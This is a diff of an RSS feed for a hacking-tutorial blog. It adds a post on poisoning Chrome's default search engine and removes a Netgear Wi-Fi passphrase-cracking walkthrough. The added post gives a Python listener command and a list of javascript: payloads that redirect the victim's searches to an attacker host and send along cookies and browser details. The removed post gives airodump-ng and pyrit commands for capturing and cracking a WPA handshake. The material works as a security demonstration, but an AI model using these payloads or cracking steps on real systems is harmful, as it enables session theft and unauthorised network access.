@@ -2,9 +2,80 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
 <channel><title>m3t4lk3y</title><link>https://metalkey.net/index.html</link>
 <description>Hacking tutorials + info</description><language>en</language>
-<lastBuildDate>Sat, 02 Jul 2016 19:14:50 +1000</lastBuildDate>
-<pubDate>Sat, 02 Jul 2016 19:14:50 +1000</pubDate>
+<lastBuildDate>Sat, 02 Jul 2016 19:43:03 +1000</lastBuildDate>
+<pubDate>Sat, 02 Jul 2016 19:43:03 +1000</pubDate>
 <atom:link href="https://metalkey.net/feed.rss" rel="self" type="application/rss+xml" />
+<item><title>
+Google Chrome Search Poison – Default Search Engine Exploit
+</title><description><![CDATA[
+
+<h2>Introduction</h2>
+
+<p>In December 2015, I discovered a vulnerability in Google Chrome's (Chromium included) default search engines feature, whereby a lack of input sanitation allows an attacker to store XSS in the victim's browser.<br>
+In this walkthrough we'll set up a Python SimpleHTTPServer and intercept the victim’s Cookies and search keywords.</p>
+
+<h2>Video Demo</h2>
+
+<p><a href="https://www.youtube.com/watch?v=WoF-LkA6fMk">https://www.youtube.com/watch?v=WoF-LkA6fMk</a><br>
+The video demonstration involves manipulation of the chrome master-preferences file to infect the user with the malicious search engine. The user is then directed to the attackers apache server, which extracts the search query, cookies and other system information and seamlessly directs them back to their search.</p>
+
+<h2>Setting up the Listener in Kali</h2>
+
+<p><code></p>
+
+<div class="code">
+root@kali:~$ <com>python -m SimpleHTTPServer 80</com>
+</div>
+
+<p></code></p>
+
+<h2>Setup on Victim Machine</h2>
+
+<ol>
+<li>Go into <strong>"Settings"</strong> in Google Chrome<br></li>
+<li>Click on <strong>"Manage Search Engines"</strong><br></li>
+<li>Enter your malicious JS and click <strong>"Make Default"</strong><br></li>
+</ol>
+
+<h2>Example</h2>
+
+<p><code></p>
+
+<div class="code">
+<com>javascript:window.location='http://192.168.1.182/%s'+escape(document.cookie);</com>
+</div>
+
+<p></code>
+Note: 192.168.1.182 is our SimpleHTTPServer.<br>
+Now whenever the victim searches using Google Chrome’s Omnibox, the malicious JS will trigger, forwarding you their cookie and search string (%s).<br></p>
+
+<h2>Other examples</h2>
+
+<p><code></p>
+
+<div class="code">
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.cookie);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.baseURI);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.domain);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(document.URL);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(location.host);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appCodeName);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appName);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.appVersion);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.userAgent);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.platform);<br>
+javascript:window.location=’http://192.168.1.182/%s ‘+escape(navigator.product);
+</div>
+
+<p></code></p>
+
+<p>Tags: <a href='tag_search-poison.html'>search-poison</a></p>
+<!-- text end -->
+]]></description><link>https://metalkey.net/google-chrome-search-poison---default-search-engine-exploit.html</link>
+<guid>https://metalkey.net/./google-chrome-search-poison---default-search-engine-exploit.html</guid>
+<dc:creator>metalkey</dc:creator>
+<pubDate>Sat, 02 Jul 2016 19:41:50 +1000</pubDate></item>
 <item><title>
 UnrealIRCD 3.2.8.1 Backdoor Command Execution
 </title><description><![CDATA[
@@ -61,6 +132,7 @@ root@metasploitable:/etc/unreal#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/unrealircd-3281-backdoor-command-execution.html</link>
 <guid>https://metalkey.net/./unrealircd-3281-backdoor-command-execution.html</guid>
@@ -107,6 +179,7 @@ root@metasploitable:/#
 <p></code></p>
 
 <p>Tags: <a href='tag_backdoors.html'>backdoors</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/vsftpd-v234-backdoor-command-execution.html</link>
 <guid>https://metalkey.net/./vsftpd-v234-backdoor-command-execution.html</guid>
@@ -202,6 +275,7 @@ root
 <p></code></p>
 
 <p>Tags: <a href='tag_privilege-escalation.html'>privilege-escalation</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</link>
 <guid>https://metalkey.net/./linux-kernel-26-udev-lt-141---local-privilege-escalation-exploit-example.html</guid>
@@ -328,6 +402,7 @@ Additional attack vectors include:<br>
 If your system is vulnerable, ensure it is patched immediately by upgrading your version of Bash then re-testing.</p>
 
 <p>Tags: <a href='tag_shellshock.html'>shellshock</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/shellshock-explained--exploitation-tutorial.html</link>
 <guid>https://metalkey.net/./shellshock-explained--exploitation-tutorial.html</guid>
@@ -442,6 +517,7 @@ C:\7-ZipPortable>
 <p></code></p>
 
 <p>Tags: <a href='tag_av-evasion.html'>av-evasion</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/shellter---the-ultimate-tool-for-av-evasion.html</link>
 <guid>https://metalkey.net/./shellter---the-ultimate-tool-for-av-evasion.html</guid>
@@ -498,6 +574,7 @@ We have successfully set txpower to 30dBM (1-Watt).<br>
 Higher values can also be set and detailed instructions are available at Null Byte (<a href="http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/">http://null-byte.wonderhowto.com/how-to/set-your-wi-fi-cards-tx-power-higher-than-30-dbm-0149606/</a>).</p>
 
 <p>Tags: <a href='tag_wifi.html'>wifi</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/increasing-the-power-output-of-your-alfa-awus036h.html</link>
 <guid>https://metalkey.net/./increasing-the-power-output-of-your-alfa-awus036h.html</guid>
@@ -567,6 +644,7 @@ You now have shell access to the Windows XP SP3 Victim with the same access as t
 <p>Keep your software fully updated (e.g. Windows, Web Browsers, Java, etc…) and uninstall unused applications.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/metasploit-browser-autopwn---windows-xp-sp2.html</link>
 <guid>https://metalkey.net/./metasploit-browser-autopwn---windows-xp-sp2.html</guid>
@@ -638,6 +716,7 @@ Mode Size Type Last modified Name<br>
 <p>Uninstall flashplayer.</p>
 
 <p>Tags: <a href='tag_metasploit.html'>metasploit</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</link>
 <guid>https://metalkey.net/./metasploit-adobe-flash-1800203-exploit---windows-7--windows-81.html</guid>
@@ -748,74 +827,10 @@ This wordlist may prove useful when cracking hashes, capture files, etc…<br>
 You can also download wordlists and improve wordlists using the -w, -l and -a options.<br></p>
 
 <p>Tags: <a href='tag_password.html'>password</a></p>
+
 <!-- text end -->
 ]]></description><link>https://metalkey.net/password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</link>
 <guid>https://metalkey.net/./password-profiling-amp-wordlist-generation-with-cupp-common-user-password-profiler.html</guid>
 <dc:creator>metalkey</dc:creator>
 <pubDate>Fri, 01 Jul 2016 15:03:26 +1000</pubDate></item>
-<item><title>
-Netgear Wireless Router Default Passphrase Vulnerability
-</title><description><![CDATA[
-
-<p><strong>OS:</strong> Debian 8</p>
-
-<p>A vulnerability exists in the default passphrase for Netgear Wireless Routers. The default passphrase consists of two words, followed by a three digit number (<a href="http://support1.gearguy.com/useruploads/images/19915v3.PNG">http://support1.gearguy.com/useruploads/images/19915v3.PNG</a>):<br>
-<strong>word1word2xxx</strong></p>
-
-<p>To exploit this vulnerability you will need “aircrack-ng”, “pyrit” and the wordlist containing all possible passphrases. Initially, i was going to generate the dictionary using /usr/share/dict/cracklib-small and “crunch”, but the Netgear dictionary is already available for download from ScriptKitty (<a href="http://www.scriptkitty.ca/index.php/wordlists/">http://www.scriptkitty.ca/index.php/wordlists/</a>).</p>
-
-<h2>Installation of Required Software</h2>
-
-<p>Manual step-by-step instructions @ blackMORE Ops (<a href="http://www.blackmoreops.com/2014/03/13/install-nvidia-driver-kernel-module-cuda-and-pyrit-kali-linux/">http://www.blackmoreops.com/2014/03/13/install-nvidia-driver-kernel-module-cuda-and-pyrit-kali-linux/</a>)
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>sudo apt-get install aircrack-ng</com><br>
-user@debian8:~$ <com>sudo apt-get install pyrit</com>
-</div>
-
-<p></code></p>
-
-<h2>Step 1 – Capturing the Handshake</h2>
-
-<p>Plug in your Alfa AWUS036H and capture the 4-way handshake.<br>
-Tutorial @ SecurityTube - <a href="http://www.securitytube.net/groups?operation=view&amp;groupId=9">http://www.securitytube.net/groups?operation=view&amp;groupId=9</a>
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>airmon-ng start wlan0</com><br>
-user@debian8:~$ <com>airodump-ng mon0</com><br>
-user@debian8:~$ <com>airodump-ng -c 1 -w netgear.cap --bssid 00:11:22:33:44:55 mon0</com><br>
-</div>
-
-<p></code></p>
-
-<h2>Step 2 – Cracking the Capture</h2>
-
-<p>Confirm you have useable handshakes, then clean up the capture file and crack the passphrase.<br>
-<code></p>
-
-<div class="code">
-user@debian8:~$ <com>pyrit -r netgear.cap analyze</com><br>
-user@debian8:~$ <com>pyrit -r netgear.cap -o stripped-netgear.cap strip</com><br>
-user@debian8:~$ <com>pyrit -r stripped-netgear.cap -i adjective_noun_3d.txt -b 00:11:22:33:44:55 attack_passthrough</com><br>
-...<br>
-Parsing file 'stripped-netgear.cap' (1/1)...<br>
-Parsed 10 packets (10 802.11-packets), got 1 AP(s)<br>
-Tried 12235614 PMKs so far; 25683 PMKs per second.<br>
-The password is <com>'magicalsquash835'</com><br>
-</div>
-
-<p></code></p>
-
-<h2>Solution</h2>
-
-<p>Never use the default passphrase provided with your router and always use complex passwords that do not follow predictable patterns.</p>
-
-<p>Tags: <a href='tag_wifi.html'>wifi</a></p>
-<!-- text end -->
-]]></description><link>https://metalkey.net/netgear-wireless-router-default-passphrase-vulnerability.html</link>
-<guid>https://metalkey.net/./netgear-wireless-router-default-passphrase-vulnerability.html</guid>
-<dc:creator>metalkey</dc:creator>
-<pubDate>Fri, 01 Jul 2016 15:02:09 +1000</pubDate></item>
 </channel></rss>
